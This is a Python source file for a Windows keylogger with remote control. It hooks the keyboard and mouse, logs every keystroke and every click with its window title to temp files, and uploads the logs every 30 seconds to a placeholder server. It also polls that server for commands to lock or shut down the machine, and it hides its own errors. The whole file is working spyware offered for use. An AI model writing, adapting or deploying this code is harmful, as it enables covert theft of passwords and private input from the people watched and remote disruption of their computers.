import pythoncom, pyHook, requests
import tempfile
import threading
import time
import os

def keyPressed(event):

	global store
	mappings = {8: "<backspace>", 13: "\n", 27: "<esc>", 32: " ", 46: "<del>", 91: "<win>",
                160: "<shft>", 162: "<ctrl>", 163: "<r-ctrl>", 164: "<alt>", 165: "<ralt>", 9: "<tab>",
                48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
                37: "←", 38: "↑", 39: "→", 40: "↓",
                192: "ö", 222: "ä", 186: "ü", 187: "+", 191: "#",
                188: ",", 190: ".", 189: "-", 219: "ß", 221: "´", 107: "+", 109: "-", 111: "/", 106: "*"
                }

	try:
		id = event.KeyID
		
		if not id in mappings:
			char = chr(id).lower()
		else:
			char = mappings.get(id)

		store = store + char
		fp = open(tempfile.gettempdir()+'\\logs_windows.txt','w+')
		fp.write(store)
		fp.close()
		

	except Exception as e:
		pass

	return 1

def OnMouseEvent(event):
	global mouse_store

	try:

		key = str(event.Position)
		window = str(event.WindowName)

		mouseEvent = "Position : "+key+", Window : "+window+"\n"

		mouse_store = mouse_store + mouseEvent

		fp = open(tempfile.gettempdir()+'\\logs_windows_mouse.txt','w+')
		fp.write(mouse_store)
		fp.close()

	except Exception as e:
		pass
	return 1

def lockComputer():

	state = False

	while True:
		
		try:

			r = requests.get("https://your_server_address/lock.txt")

			if r.text == 'L':
				if state==True:
					state=False
					os.system('rundll32.exe user32.dll,LockWorkStation')
			elif r.text == 'S':
				if state==True:
					state=False
					os.system('shutdown -s')
			elif r.text == 'R':
				state=True
		except:
			pass


def uploadFile():

	while True:
		time.sleep(30)
		try:
			url = 'https://your_server_address/python_file.php'
			files = {'key': open(tempfile.gettempdir()+'\\logs_windows.txt', 'rb'),'mouse': open(tempfile.gettempdir()+'\\logs_windows_mouse.txt', 'rb')}
			r = requests.post(url, files=files)
		except:
			pass
		

store = ''
mouse_store = ''

t1 = threading.Thread(target=uploadFile)
t1.start()

t2 = threading.Thread(target=lockComputer)
t2.start()

obj = pyHook.HookManager()

obj.KeyDown = keyPressed

obj.MouseAllButtonsDown = OnMouseEvent

obj.HookKeyboard()

obj.HookMouse()

pythoncom.PumpMessages()
